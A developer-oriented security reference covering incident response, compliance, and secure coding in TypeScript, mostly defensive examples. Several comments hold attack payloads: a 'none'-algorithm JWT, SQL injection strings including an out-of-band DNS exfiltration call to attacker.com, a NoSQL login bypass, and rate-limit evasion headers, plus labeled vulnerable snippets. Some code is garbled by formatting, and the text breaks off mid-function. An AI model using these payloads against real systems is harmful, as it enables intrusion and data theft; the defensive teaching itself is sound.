    ## INCIDENT RESPONSE DEEP ATLAS 2
    
    ## Each keyword = expandable process 2
    
    ## Preparation 2
    
    - Runbooks: step-by-step
    
    - Playbooks: automated
    
    - War rooms: communication
    
    - Tabletop exercises: practice
    
    - Contact lists: escalation
    
    ## Detection & Analysis 2
    
    - Alert triage: severity
    
    - IOC matching: known bad
    
    - Forensics: evidence collection
    
    - Timeline: event correlation
    
    - Scope: blast radius
    
    ## Containment 2
    
    - Network isolation: quarantine
    
    - Account lockout: credential reset
    
    - Kill switch: feature flags
    
    - Backup verification: recovery
    
    - Preserve evidence: forensics
    
    ## Recovery & Lessons 2
    
    - Service restoration: priority
    
    - Root cause analysis: 5 whys
    
    - Post-mortem: blameless
    
    - Action items: prevention
    
    - Communication: stakeholders
    
    ## COMPLIANCE DEEP ATLAS 2
    
    ## Each keyword = expandable framework 2
    
    ## SOC 2 2
    
    - Trust Services Criteria
    
    - Type I: point-in-time
    
    - Type II: period of time
    
    - Controls: evidence
    
    - Auditor: independent
    
    ## ISO 27001 2
    
    - ISMS: management system
    
    - Risk assessment: methodology
    
    - Controls: Annex A
    
    - Certification: audit
    
    - Continuous improvement
    
    ## GDPR 2
    
    - Lawful basis: consent, legitimate
    
    - Data subject rights: access, erasure
    
    - DPIA: impact assessment
    
    - DPO: data protection officer
    
    - Breach notification: 72 hours
    
    ## Industry-Specific 2
    
    - HIPAA: healthcare, PHI
    
    - PCI DSS: payment cards
    
    - FedRAMP: US government
    
    - NIST CSF: framework
    
    - CIS: benchmarks
    
    ## SECURE SDLC DEEP ATLAS 2
    
    ## Each keyword = expandable practice 2
    
    ## Shift Left 2
    
    - Threat modeling: STRIDE, PASTA
    
    - Secure design: architecture review
    
    - Security requirements: user stories
    
    - Training: secure coding
    
    - Code review: security focus
    
    ## Build Security 2
    
    - SAST: static analysis
    
    - SCA: dependency scanning
    
    - Secrets scanning: leaked creds
    
    - Container scanning: vulnerabilities
    
    - IaC scanning: misconfigurations
    
    ## Deploy Security 2
    
    - DAST: dynamic testing
    
    - Pen testing: manual
    
    - Security gates: CI/CD
    
    - Signed artifacts: integrity
    
    - Immutable infrastructure
    
    ## Runtime Security 2
    
    - RASP: runtime protection
    
    - WAF: application firewall
    
    - Bot management: detection
    
    - Rate limiting: abuse prevention
    
    - Monitoring: anomaly detection
    
    ### END OF ULTRA SECURITY EXPANSION 2
    
    ### Continuing expansion in next iteration 2
    
    ## SECURITY CODE EXAMPLES 2
    
    ## INPUT VALIDATION 5
    
    ## Sanitization Middleware 2
    
    **Why it exists:**Prevent XSS and injection attacks
    
    // middleware/sanitize.ts
    import DOMPurify from 'isomorphic-dompurify';
    import { z } from 'zod';
    
    // Sanitize HTML input
    export function sanitizeHtml(dirty: string): string {
    return DOMPurify.sanitize(dirty, {
    ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'a', 'p', 'br'],
    ALLOWED_ATTR: ['href', 'target'],
          });
        }
    
    // SQL injection prevention - always use parameterized queries
    // NEVER do:`SELECT* FROM users WHERE id = ${userId}`// DO: prisma.user.findUnique({ where: { id: userId } })
    
    // NoSQL injection prevention
    export const mongoIdSchema = z.string().regex(/^[a-f\d]{24}$/i, 'Invalid ID');
    
    // Path traversal prevention
    export function sanitizePath(userInput: string): string {
    return userInput.replace(/\.\./g, '').replace(/[\/\\]/g, '');
        }
    
    ## CSRF PROTECTION 3
    
    ## Token-based CSRF 2
    
    **Why it exists:** Prevent cross-site request forgery
    
    // lib/csrf.ts
    import crypto from 'crypto';
    
    export function generateCsrfToken(): string {
    return crypto.randomBytes(32).toString('hex');
        }
    
    export function verifyCsrfToken(token: string, sessionToken: string): boolean {
    return crypto.timingSafeEqual(
            Buffer.from(token),
            Buffer.from(sessionToken)
          );
        }
    
    // Middleware
    export function csrfMiddleware(req, res, next) {
    if (['POST', 'PUT', 'DELETE', 'PATCH'].includes(req.method)) {
    | const token = req.headers['x-csrf-token'] | req.body._csrf; |
    | if (!token | !verifyCsrfToken(token, req.session.csrfToken)) { |
    return res.status(403).json({ error: 'Invalid CSRF token' });
            }
          }
          next();
        }
    
    ## ENCRYPTION 2
    
    ## Data Encryption at Rest 2
    
    **Why it exists:** Protect sensitive data
    
    // lib/encryption.ts
    import crypto from 'crypto';
    
    const ALGORITHM = 'aes-256-gcm';
    const KEY = Buffer.from(process.env.ENCRYPTION_KEY!, 'hex');
    
    export function encrypt(plaintext: string): string {
    const iv = crypto.randomBytes(16);
    const cipher = crypto.createCipheriv(ALGORITHM, KEY, iv);
    
    let encrypted = cipher.update(plaintext, 'utf8', 'hex');
    encrypted += cipher.final('hex');
    
    const authTag = cipher.getAuthTag();
    
    return`${iv.toString('hex')}:${authTag.toString('hex')}:${encrypted}`;
        }
    
    export function decrypt(ciphertext: string): string {
    const [ivHex, authTagHex, encrypted] = ciphertext.split(':');
    
    const iv = Buffer.from(ivHex, 'hex');
    const authTag = Buffer.from(authTagHex, 'hex');
    
    const decipher = crypto.createDecipheriv(ALGORITHM, KEY, iv);
          decipher.setAuthTag(authTag);
    
    let decrypted = decipher.update(encrypted, 'hex', 'utf8');
    decrypted += decipher.final('utf8');
    
    return decrypted;
        }
    
    // Password hashing - NEVER store plain passwords
    import bcrypt from 'bcryptjs';
    
    export async function hashPassword(password: string): Promise<string> {
    return bcrypt.hash(password, 12); // 12 rounds
        }
    
    export async function verifyPassword(password: string, hash: string): Promise<boolean> {
    return bcrypt.compare(password, hash);
        }
    
    ## API KEY MANAGEMENT 2
    
    ## Secure API Key Generation 2
    
    **Why it exists:** Secure programmatic access
    
    // lib/apiKeys.ts
    import crypto from 'crypto';
    import { prisma } from './prisma';
    
    export async function generateApiKey(userId: string, name: string) {
    // Generate key: prefix + random bytes
    const prefix = 'sk_live_';
    const key = prefix + crypto.randomBytes(32).toString('base64url');
    
    // Store only the hash
    const hash = crypto.createHash('sha256').update(key).digest('hex');
    
    await prisma.apiKey.create({
    data: {
            userId,
            name,
            hash,
    prefix: key.slice(0, 12),
    lastUsed: null,
            },
          });
    
    // Return key only once - user must store it
    return { key, prefix: key.slice(0, 12) };
        }
    
    export async function validateApiKey(key: string) {
    const hash = crypto.createHash('sha256').update(key).digest('hex');
    
    const apiKey = await prisma.apiKey.findFirst({
    where: { hash, revokedAt: null },
    include: { user: true },
          });
    
    if (apiKey) {
    await prisma.apiKey.update({
    where: { id: apiKey.id },
    data: { lastUsed: new Date() },
            });
          }
    
    return apiKey;
        }
    
    ## SECURITY HEADERS 3
    
    ## Helmet Configuration 2
    
    **Why it exists:** HTTP security headers
    
    import helmet from 'helmet';
    
        app.use(helmet({
    contentSecurityPolicy: {
    directives: {
    defaultSrc: ["'self'"],
    scriptSrc: ["'self'", "'unsafe-inline'", "cdn.example.com"],
    styleSrc: ["'self'", "'unsafe-inline'", "fonts.googleapis.com"],
    imgSrc: ["'self'", "data:", "*.cloudfront.net"],
    connectSrc: ["'self'", "api.example.com"],
    fontSrc: ["'self'", "fonts.gstatic.com"],
    frameSrc: ["'none'"],
    objectSrc: ["'none'"],
            },
          },
    hsts: { maxAge: 31536000, includeSubDomains: true, preload: true },
    referrerPolicy: { policy: 'strict-origin-when-cross-origin' },
        }));
    
    ### CONTINUED: MORE SECURITY PATTERNS 2
    
    ## DEFENSE 2
    
    ## JWT VULNERABILITIES DEEP DIVE 2
    
    ## Production JWT Attack Patterns 2
    
    **Source:**Auth0 Security Research, PortSwigger Web Security**Why this is critical:** JWT misconfigurations are among top 10 API vulnerabilities
    
        /**
    
    - JWT VULNERABILITY #1: Algorithm Confusion Attack
    - *THE BUG: Server accepts tokens signed with different algorithms
    - than expected. Attacker can use "none" algorithm or switch from
    - RS256 (asymmetric) to HS256 (symmetric) using public key as secret.
    
    -* REAL INCIDENT: 2015 - Multiple libraries vulnerable
    
    - CVE-2015-9235, CVE-2016-10555
    
         */
    
    // VULNERABLE: Library switches algorithm based on token header
    const jwt = require('jsonwebtoken');
    
    // Attacker creates token with header: {"alg":"none","typ":"JWT"}
    // Body: {"sub":"admin","role":"admin"}
    // Signature: (empty)
    // Some libraries will accept this!
    
    // SECURE: Always specify expected algorithm
    function verifyToken(token: string): JWTPayload {
    return jwt.verify(token, SECRET_KEY, {
    algorithms: ['HS256'], // EXPLICIT algorithm whitelist
    issuer: 'your-app',
    audience: 'your-api',
          });
        }
    
        /**
    
    - JWT VULNERABILITY #2: Key Injection in JWK Header
    - *THE BUG: JWT header contains embedded JWK (JSON Web Key).
    - Server uses attacker-supplied key to verify signature.
    - Attacker controls key = attacker can forge any token.
    
        */
    
    // VULNERABLE: Trust key from token header
    const header = JSON.parse(base64Decode(token.split('.')[0]));
    const key = header.jwk; // ATTACKER CONTROLLED!
    jwt.verify(token, key);
    
    // SECURE: Only use server-side key storage
    const TRUSTED_KEYS = await loadKeysFromKMS();
    
    function verifyWithTrustedKeys(token: string): JWTPayload {
    const decoded = jwt.decode(token, { complete: true });
    const kid = decoded.header.kid;
    
    const key = TRUSTED_KEYS.get(kid);
    if (!key) throw new Error('Unknown key ID');
    
    return jwt.verify(token, key, { algorithms: ['RS256'] });
        }
    
        /**
    
    - JWT VULNERABILITY #3: Weak Secret Brute Force
    - *THE BUG: HS256 with weak secret can be cracked offline.
    - Once cracked, attacker can forge any token forever.
    
    -*HASHCAT BENCHMARK: 15 billion HS256 attempts/second on GPU*/
    
    // WEAK: Short/predictable secrets
    const weakSecrets = [
          'secret',
          'password123',
          process.env.APP_NAME,
          '1234567890',
        ];
    
    // SECURE: Minimum 256-bit entropy
    import { randomBytes } from 'crypto';
    
    function generateSecureSecret(): string {
    return randomBytes(32).toString('base64'); // 256 bits
        }
    
    // Even better: Use asymmetric (RS256, ES256)
    // - No shared secret to leak
    // - Can rotate public keys without downtime
    // - Supports key revocation via JWKS
    
        /**
    
    - JWT SECURITY AUDIT CHECKLIST
    - *1. [ ] Algorithm specified explicitly (not from token header)
    - 2. [ ] Key material from trusted source (not token)
    - 3. [ ] Secret has sufficient entropy (256+ bits for HS256)
    - 4. [ ] Token expiration enforced (exp claim)
    - 5. [ ] Issuer validated (iss claim)
    - 6. [ ] Audience validated (aud claim)
    - 7. [ ] Token revocation mechanism exists
    - 8. [ ] Refresh token rotation implemented
    
        */
    
    ## SQL INJECTION BEYOND BASICS 2
    
    ## Second-Order & Blind SQL Injection 2
    
    **Source:**OWASP Testing Guide, Real penetration test findings**Why this is hard:** Automated scanners miss these
    
        /**
    
    - SECOND-ORDER SQL INJECTION
    - *THE BUG: Input is safely stored, but later queries use it unsafely.
    - Scanner only tests immediate responses, misses delayed execution.
    
    -* EXAMPLE SCENARIO:
    
    - 1. User registers with username: admin'--
    - 2. Registration uses parameterized query (safe)
    - 3. Password reset uses: `SELECT *FROM users WHERE username = '${username}'`- 4. Attacker triggers password reset for their account
    - 5. Query becomes: SELECT* FROM users WHERE username = 'admin'--'
    - 6. Attacker gets password reset for admin account
    
         */
    
    // VULNERABLE: Trusting database values
    async function sendPasswordReset(userId: string) {
    const user = await db.query('SELECT username FROM users WHERE id = ?', [userId]);
    
    // Username came from DB, but was user-supplied at registration!
    const resetToken = await db.query(`INSERT INTO reset_tokens (token, username)
    VALUES (?, '${user.username}')  -- VULNERABLE!
    RETURNING token`);
        }
    
    // SECURE: Parameterize EVERYWHERE, even "trusted" data
    async function sendPasswordResetSecure(userId: string) {
    const user = await db.query('SELECT username FROM users WHERE id = ?', [userId]);
    
    const resetToken = await db.query(
    'INSERT INTO reset_tokens (token, username) VALUES (?, ?) RETURNING token',
    [generateToken(), user.username]  // Parameterized!
          );
        }
    
        /**
    
    - BLIND SQL INJECTION TECHNIQUES
    - *When error messages are hidden, attackers use:
    - 1. Boolean-based: Different response for true/false conditions
    - 2. Time-based: SLEEP() or heavy query for true condition
    - 3. Out-of-band: DNS/HTTP exfiltration
    
        */
    
    // Time-based blind SQLi detection
    // Attacker payload: admin' AND SLEEP(5)--
    // If response takes 5 seconds, injection confirmed
    
    // DEFENSE: SQL query timeout + parameterization
    const pool = new Pool({
    statement_timeout: 5000, // 5 second max
        });
    
    // Out-of-band detection (advanced)
    // Payload: admin'; SELECT LOAD_FILE(CONCAT('\\\\',@@version,'.attacker.com\\x'))--
    // Attacker's DNS receives: 5.7.32.attacker.com
    
        /**
    
    - NOSQL INJECTION
    - *MongoDB and other NoSQL DBs have their own injection patterns
    
        */
    
    // VULNERABLE: Object injection
    app.post('/login', (req, res) => {
    const user = await db.collection('users').findOne({
    username: req.body.username,  // What if this is { "$gt": "" }?
    password: req.body.password,
          });
        });
    
    // Attacker sends: { "username": {"$gt": ""}, "password": {"$gt": ""} }
    // Query becomes: find where username > "" AND password > ""
    // Returns first user in database!
    
    // SECURE: Type validation + sanitization
    import { z } from 'zod';
    
    const loginSchema = z.object({
    username: z.string().max(50),
    password: z.string().max(100),
        });
    
    app.post('/login', async (req, res) => {
    const { username, password } = loginSchema.parse(req.body);
    // Now guaranteed to be strings, not objects
        });
    
    ## RATE LIMITING BYPASS TECHNIQUES 2
    
    ## Production Rate Limit Evasion 2
    
    **Source:**Bug bounty reports, Security research**Why standard rate limiting fails:** Attackers know the bypass tricks
    
        /**
    
    - RATE LIMITING BYPASS TECHNIQUES (FOR DEFENDERS TO KNOW)
    - *1. IP ROTATION
    - - Cloud IPs, residential proxies, Tor exit nodes
    - - Defense: Rate limit by account, not just IP
    
    -* 2. HEADER MANIPULATION
    
    - - X-Forwarded-For: 127.0.0.1
    - - X-Real-IP: 10.0.0.1
    - - Defense: Only trust headers from known proxies
    - *3. PARAMETER POLLUTION
    - - /login?user=admin vs /login?user=admin&extra=1
    - - Defense: Normalize requests before rate limiting
    
    -* 4. CASE MANIPULATION
    
    - - /Login vs /LOGIN vs /login
    - - Defense: Lowercase all paths
    - *5. ENCODING TRICKS
    - - /login vs /l%6fgin (URL encoded 'o')
    - - Defense: Decode before rate limiting
    
        */
    
    class RobustRateLimiter {
    async checkLimit(req: Request): Promise<{ allowed: boolean; retryAfter?: number }> {
    // 1. Get TRUE client IP (not spoofed headers)
    const ip = this.getTrueClientIP(req);
    
    // 2. Normalize request path
    const path = this.normalizePath(req.path);
    
    // 3. Get user ID if authenticated
    const userId = req.user?.id;
    
    // 4. Check multiple dimensions
    const checks = await Promise.all([
            this.checkIPLimit(ip),
    userId && this.checkUserLimit(userId),
            this.checkGlobalLimit(),
            ]);
    
    const blocked = checks.find(c => c && !c.allowed);
    if (blocked) {
    return { allowed: false, retryAfter: blocked.retryAfter };
            }
    
    return { allowed: true };
          }
    
    private getTrueClientIP(req: Request): string {
    // Only trust X-Forwarded-For from known load balancers
    const forwardedFor = req.headers['x-forwarded-for'];
    
    if (forwardedFor && this.isFromTrustedProxy(req.ip)) {
    // Take rightmost IP (added by our proxy)
    const ips = forwardedFor.split(',').map(ip => ip.trim());
    return ips[ips.length - 1];
            }
    
    return req.ip;
          }
    
    private normalizePath(path: string): string {
    return decodeURIComponent(path)
            .toLowerCase()
    .replace(/\/+/g, '/')  // Collapse multiple slashes
    .replace(/\/$/, '');   // Remove trailing slash
          }
    
    private isFromTrustedProxy(ip: string): boolean {
    const trustedCIDRs = [
    '10.0.0.0/8', // Internal network
    '172.16.0.0/12', // Internal network
    '192.168.0.0/16', // Internal network
            ];
    
    return trustedCIDRs.some(cidr => this.ipInCIDR(ip, cidr));
          }
        }
    
        /**
    
    - DISTRIBUTED RATE LIMITING
    - *Single-server rate limiting doesn't scale.
    - Must use centralized store (Redis) for consistency.
    
    -*SLIDING WINDOW ALGORITHM (more accurate than fixed window)*/
    
    class SlidingWindowRateLimiter {
    constructor(private redis: Redis) {}
    
    async isAllowed(
    key: string,
    limit: number,
    windowMs: number
    ): Promise<boolean> {
    const now = Date.now();
    const windowStart = now - windowMs;
    
    const multi = this.redis.multi();
    
    // Remove old entries
    multi.zremrangebyscore(key, 0, windowStart);
    
    // Count current window
            multi.zcard(key);
    
    // Add current request
    multi.zadd(key, now.toString(),`${now}-${Math.random()}`);
    
    // Set expiry
    multi.expire(key, Math.ceil(windowMs / 1000));
    
    const results = await multi.exec();
    const count = results[1][1] as number;
    
    return count < limit;
          }
        }
    
    ### [SECURITY RESEARCHER LEVEL] CONTINUED: MORE PATTERNS 2
    
    ### Density: OWASP/Bug Bounty research quality 2
    
    ## SECURITY - PENETRATION TESTING 2
    
    > **The offensive security patterns**
    
    ## Pen Test Phases 2
    
    1. RECONNAISSANCE
    - Gather public info
    - DNS records, subdomains
    - Tech stack identification
    
    1. SCANNING
    - Port scanning (nmap)
    - Vulnerability scanning
    - Service enumeration
    
    1. EXPLOITATION
    - Attempt identified vulnerabilities
    - Gain access if possible
    
    1. POST-EXPLOITATION
    - Privilege escalation
    - Lateral movement
    - Data exfiltration (simulated)
    
    1. REPORTING
    - Document findings
    - Risk assessment
    - Remediation recommendations
    
    ## Common Findings 2
    
    | Finding | Risk | Remediation |
    
    | SQL Injection | Critical | Parameterized queries |
    | XSS | High | Output encoding |
    | Weak passwords | High | Password policy |
    | Missing headers | Medium | Add security headers |
    | Info disclosure | Low | Remove verbose errors |
    
    ## Bug Bounty Scope 2
    
    IN SCOPE:
    
    - Main application
    
    - API endpoints
    
    - Authentication flows
    
    OUT OF SCOPE:
    
    - Third-party services
    
    - Social engineering
    
    - Physical attacks
    
    - DoS testing (unless approved)
    
    ## INCIDENT RESPONSE PLAYBOOK 2
    
    > **The security incident handling**
    
    ## Incident Classification 2
    
    | Level | Description | Response |
    
    | SEV1 | Active breach, data exposed | Immediate, all hands |
    | SEV2 | Vulnerability exploited | Within 1 hour |
    | SEV3 | Suspicious activity | Within 4 hours |
    | SEV4 | Minor security issue | Next business day |
    
    ## Response Steps 2
    
    1. DETECT & IDENTIFY
    - What is happening?
    - When did it start?
    - What systems affected?
    
    1. CONTAIN
    - Isolate affected systems
    - Block malicious IPs
    - Disable compromised accounts
    
    1. ERADICATE
    - Remove malware
    - Patch vulnerabilities
    - Reset credentials
    
    1. RECOVER
    - Restore from clean backups
    - Verify integrity
    - Monitor closely
    
    1. POST-INCIDENT
    - Document timeline
    - Root cause analysis
    - Lessons learned
    - Update defenses
    
    ## Evidence Preservation 2
    
    [ ] Capture system state
    [ ] Preserve logs (immutable)
    [ ] Memory dumps if needed
    [ ] Network captures
    [ ] Screenshots
    [ ] Chain of custody
    
    ## SECRETS ROTATION 2
    
    > **The credential lifecycle patterns**
    
    ## Rotation Strategy 2
    
    1. GENERATE new secret
    1. CONFIGURE both old and new secrets valid
    1. UPDATE all consumers to use new
    1. VERIFY all using new secret
    1. INVALIDATE old secret
    1. DELETE old secret from storage
    
    ## AWS Secrets Manager 2
    
    const {
          SecretsManagerClient,
          GetSecretValueCommand
    } = require("@aws-sdk/client-secrets-manager");
    
    const client = new SecretsManagerClient();
    
    async function getSecret(secretName) {
    const response = await client.send(
    new GetSecretValueCommand({ SecretId: secretName })
          );
    return JSON.parse(response.SecretString);
        }
    
    // Enable auto-rotation in AWS Console
    // Lambda function handles rotation
    
    ## Database Password Rotation 2
    
    CHALLENGE: Zero-downtime rotation
    
        STEPS:
    
    1. Create new user with same permissions
    1. Update app to use new credentials
    1. Wait for connection pool refresh
    1. Drop old user
    
    OR use dual-password support:
    
    - PostgreSQL: CREATE ROLE with multiple passwords (extensions)
    
    - AWS RDS: Secrets Manager integration
    
    ## AUTHENTICATION PATTERNS 2
    
    > **The auth implementation patterns**
    
    ## Stateless JWT Flow 2
    
    1. User logs in with credentials
    1. Server validates, creates JWT
    1. JWT contains: { userId, role, exp }
    1. Client stores JWT (httpOnly cookie)
    1. Client sends JWT with each request
    1. Server validates JWT signature
    1. No session storage needed!
    
    ## Refresh Token Pattern 2
    
    // Access token: Short-lived (15 min)
    const accessToken = jwt.sign(
    { userId, role },
          ACCESS_SECRET,
    { expiresIn: '15m' }
        );
    
    // Refresh token: Long-lived (7 days)
    const refreshToken = jwt.sign(
    { userId, tokenVersion },
          REFRESH_SECRET,
    { expiresIn: '7d' }
        );
    
    // Store refresh token hash in DB
    // Rotate on each use
    
    ## Token Revocation 2
    
    // Option 1: Short expiry (accept gap)
    // Tokens valid until expiry even after logout
    
    // Option 2: Token blacklist
    const blacklist = new Set(); // or Redis
        blacklist.add(tokenId);
    
    // Option 3: Token versioning
    // user.tokenVersion = 1
    // JWT contains version
    // Increment version to invalidate all
    
    ## SECURITY LOGGING 2
    
    > **The audit and security event patterns**
    
    ## What to Log 3
    
        AUTHENTICATION:
    
    - Login success/failure
    
    - Password reset requests
    
    - MFA challenges
    
    - Session creation/destruction
    
        AUTHORIZATION:
    
    - Access denied events
    
    - Privilege escalation attempts
    
    - Resource access patterns
    
    DATA ACCESS:
    
    - Sensitive data queries
    
    - Bulk exports
    
    - Admin actions
    
        SYSTEM:
    
    - Configuration changes
    
    - API key creation/revocation
    
    - User permission changes
    
    ## Log Format 3
    
    const securityLog = {
    timestamp: new Date().toISOString(),
    eventType: 'authentication.login_failure',
    severity: 'warning',
    actor: {
    ip: '192.168.1.1',
    userAgent: 'Mozilla/5.0...',
    userId: null // Unknown on failed login
          },
    target: {
    type: 'user',
    identifier: 'user@example.com'
          },
    outcome: 'failure',
    reason: 'invalid_password',
    metadata: {
    attemptCount: 3,
    lockoutTriggered: false
          }
        };
    
    ## Alerting Thresholds 2
    
    IMMEDIATE ALERT:
    
    - 5 failed logins in 5 minutes (same user)
    
    - Login from new country
    
    - Admin privilege granted
    
    - Bulk data export
    
    DAILY REVIEW:
    
    - All failed login attempts
    
    - Permission changes
    
    - API key usage
    
        WEEKLY:
    
    - Access pattern analysis
    
    - Unused privileges
    
    ## INPUT VALIDATION PATTERNS 2
    
    > **The data sanitization patterns**
    
    ## Zod Schema Validation 2
    
    import { z } from 'zod';
    
    const UserSchema = z.object({
    email: z.string().email(),
    password: z.string().min(8).max(100),
    age: z.number().int().positive().max(150).optional(),
    role: z.enum(['user', 'admin']).default('user')
        });
    
    // Parse and validate
    const user = UserSchema.parse(requestBody);
    // Throws ZodError if invalid
    
    ## Express Middleware 2
    
    const validate = (schema: z.ZodSchema) => {
    return (req: Request, res: Response, next: NextFunction) => {
    try {
    req.body = schema.parse(req.body);
            next();
    } catch (error) {
    if (error instanceof z.ZodError) {
    return res.status(400).json({
    error: 'Validation failed',
    details: error.errors
            });
            }
            next(error);
            }
          };
        };
    
    app.post('/users', validate(UserSchema), createUser);
    
    ## Sanitization 3
    
    import DOMPurify from 'isomorphic-dompurify';
    
    // HTML sanitization
    const cleanHtml = DOMPurify.sanitize(userInput);
    
    // SQL - use parameterized queries (Prisma does this)
    // Never concatenate user input into SQL
    
    // File paths - validate and sanitize
    const safePath = path.basename(userInput);
    // Removes directory traversal
    
    ## SECURE SESSION MANAGEMENT 2
    
    > **The session security patterns**
    
    ## Session ID Generation 2
    
    // INSECURE: Predictable
    const sessionId = `${userId}-${Date.now()}`;
    
    // SECURE: Cryptographically random
    const sessionId = crypto.randomBytes(32).toString('hex');
    
    ## Cookie Settings 3
    
    res.cookie('session', sessionId, {
    httpOnly: true,    // No JS access
    secure: true,  // HTTPS only
    sameSite: 'strict', // CSRF protection
    maxAge: 24 *60*60*1000, // 24 hours
    path: '/',
    domain: '.example.com'
        });
    
    ## Session Fixation Prevention 2
    
    // On login: Create NEW session, don't reuse
    app.post('/login', async (req, res) => {
    // Destroy any existing session
          req.session.destroy();
    
    // Create fresh session after auth
    req.session.regenerate(() => {
    req.session.userId = user.id;
            res.redirect('/dashboard');
          });
        });
    
    ## Idle Timeout 2
    
    const SESSION_IDLE_TIMEOUT = 30*60*1000; // 30 min
    
    app.use((req, res, next) => {
    if (req.session.lastActivity) {
    const idle = Date.now() - req.session.lastActivity;
    if (idle > SESSION_IDLE_TIMEOUT) {
            req.session.destroy();
    return res.redirect('/login');
            }
          }
    req.session.lastActivity = Date.now();
          next();
        });
    
    ## SECURITY HEADERS DEEP DIVE 2
    
    >**The essential HTTP security headers**
    
    ## Strict-Transport-Security 2
    
    Strict-Transport-Security: max-age=31536000; includeSubDomains; preload
    
    WHAT: Forces HTTPS for 1 year
    WHY: Prevents SSL stripping attacks
    PRELOAD: Submit to browser preload list
    
    CAUTION: Test thoroughly before enabling
    Cannot be undone easily!
    
    ## Content-Security-Policy 2 2
    
        Content-Security-Policy:
    default-src 'self';
    script-src 'self' 'unsafe-inline' <<<<<<https://cdn.example.com;>>>>>>
    style-src 'self' 'unsafe-inline';
    img-src 'self' data: https:;
    connect-src 'self' <<<<<<https://api.example.com;>>>>>>
    frame-ancestors 'none';
    base-uri 'self';
    form-action 'self';
    
    REPORT: Add report-uri to collect violations
    
    ## X-Frame-Options 2
    
    X-Frame-Options: DENY
    
        OPTIONS:
    
    - DENY: Never allow framing
    
    - SAMEORIGIN: Only same origin
    
    - ALLOW-FROM uri: Specific origin (deprecated)
    
    WHY: Prevents clickjacking attacks
    
    ## Permissions-Policy 2
    
        Permissions-Policy:
          geolocation=(),
          microphone=(),
          camera=(),
          payment=(self)
    
    WHAT: Controls browser features
    WHY: Reduces attack surface
    
    ## PASSWORD SECURITY 3
    
    > **The authentication security patterns**
    
    ## Hashing Algorithm Choice 2
    
    RECOMMENDED: Argon2id
    
    - Memory-hard (resistant to GPU attacks)
    - Modern, well-analyzed
    
    ACCEPTABLE: bcrypt
    
    - Proven, widely supported
    - 10+ rounds minimum
    
        AVOID:
    
    - MD5, SHA1, SHA256 (too fast!)
    - Plain bcrypt without salt
    - Custom hashing schemes
    
    ## Implementation 3
    
    import argon2 from 'argon2';
    
    async function hashPassword(password) {
    return await argon2.hash(password, {
    type: argon2.argon2id,
    memoryCost: 65536,  // 64 MB
    timeCost: 3,  // iterations
    parallelism: 4  // threads
          });
        }
    
    async function verifyPassword(password, hash) {
    try {
    return await argon2.verify(hash, password);
    } catch {
    return false;
          }
        }
    
    ## Password Policy 2
    
    const passwordPolicy = {
    minLength: 12,  // Not 8!
    maxLength: 128,  // Prevent DoS
    requireUppercase: false, // Debatable
    requireNumber: false,    // Debatable
    requireSpecial: false,   // Debatable
    checkBreached: true  // HaveIBeenPwned API
        };
    
    // Better: Check entropy or use zxcvbn library
    import zxcvbn from 'zxcvbn';
    const result = zxcvbn(password);
    if (result.score < 3) {
    throw new Error(result.feedback.warning);
        }
    
    ## API AUTHENTICATION PATTERNS 2
    
    > **The secure API access patterns**
    
    ## API Key vs JWT vs OAuth 2
    
    | Method | Use Case | Security |
    
    | API Key | Server-to-server | Shared secret |
    | JWT | User authentication | Signed tokens |
    | OAuth | Third-party access | Delegated auth |
    
    ## API Key Best Practices 2
    
    // Generate secure key
    const apiKey = crypto.randomBytes(32).toString('hex');
    
    // Store hash, not key
    const keyHash = crypto.createHash('sha256').update(apiKey).digest('hex');
    
    // Validate
    function validateApiKey(providedKey) {
    const hash = crypto.createHash('sha256').update(providedKey).digest('hex');
    return db.apiKeys.findOne({ hash });
        }
    
    ## JWT for APIs 2
    
    // Create token
    const token = jwt.sign(
    { sub: userId, scope: ['read', 'write'] },
          process.env.JWT_SECRET,
    { expiresIn: '1h', issuer: 'api.example.com' }
        );
    
    // Validate
    app.use((req, res, next) => {
    const token = req.headers.authorization?.replace('Bearer ', '');
    try {
    req.user = jwt.verify(token, process.env.JWT_SECRET);
            next();
    } catch {
    res.status(401).json({ error: 'Invalid token' });
          }
        });
    
    ## Scope-Based Authorization 2
    
    function requireScope(...requiredScopes) {
    return (req, res, next) => {
    | const userScopes = req.user.scope | []; |
    const hasScope = requiredScopes.every(s => userScopes.includes(s));
    
    if (!hasScope) {
    return res.status(403).json({ error: 'Insufficient permissions' });
            }
            next();
          };
        }
    
    app.delete('/users/:id', requireScope('users:delete'), deleteUser);
    
    ## RBAC IMPLEMENTATION 2
    
    > **Role-Based Access Control patterns**
    
    ## Database Schema 2
    
    CREATE TABLE roles (
    id SERIAL PRIMARY KEY,
    name VARCHAR UNIQUE NOT NULL
        );
    
    CREATE TABLE permissions (
    id SERIAL PRIMARY KEY,
    name VARCHAR UNIQUE NOT NULL,
    resource VARCHAR NOT NULL,
    action VARCHAR NOT NULL
        );
    
    CREATE TABLE role_permissions (
    role_id INT REFERENCES roles(id),
    permission_id INT REFERENCES permissions(id),
    PRIMARY KEY (role_id, permission_id)
        );
    
    CREATE TABLE user_roles (
    user_id INT REFERENCES users(id),
    role_id INT REFERENCES roles(id),
    PRIMARY KEY (user_id, role_id)
        );
    
    ## Permission Check 2
    
    async function hasPermission(
    userId: string,
    resource: string,
    action: string
    ): Promise<boolean> {
    const result = await db.$queryRaw`SELECT 1 FROM user_roles ur
    JOIN role_permissions rp ON ur.role_id = rp.role_id
    JOIN permissions p ON rp.permission_id = p.id
    WHERE ur.user_id = ${userId}
    AND p.resource = ${resource}
    AND p.action = ${action}
    LIMIT 1`;
    return result.length > 0;
        }
    
    ## Middleware 2
    
    function requirePermission(resource: string, action: string) {
    return async (req: Request, res: Response, next: NextFunction) => {
    const canAccess = await hasPermission(req.user.id, resource, action);
    
    if (!canAccess) {
    return res.status(403).json({ error: 'Permission denied' });
            }
            next();
          };
        }
    
        app.delete('/posts/:id',
    requirePermission('posts', 'delete'),
          deletePost
        );
    
    ## MFA IMPLEMENTATION 2
    
    > **Multi-factor authentication patterns**
    
    ## TOTP (Time-based One-Time Password) 2
    
    import speakeasy from 'speakeasy';
    
    // Setup: Generate secret
    const secret = speakeasy.generateSecret({
    name: 'MyApp',
    issuer: 'MyApp'
        });
    
    // Return to user:
    // secret.otpauth_url (for QR code)
    // secret.base32 (for manual entry)
    
    // Verification
    function verifyTOTP(userToken, secret) {
    return speakeasy.totp.verify({
    secret: secret,
    encoding: 'base32',
    token: userToken,
    window: 1 // Allow 30s clock drift
          });
        }
    
    ## Backup Codes 2
    
    function generateBackupCodes(count = 10) {
    const codes = [];
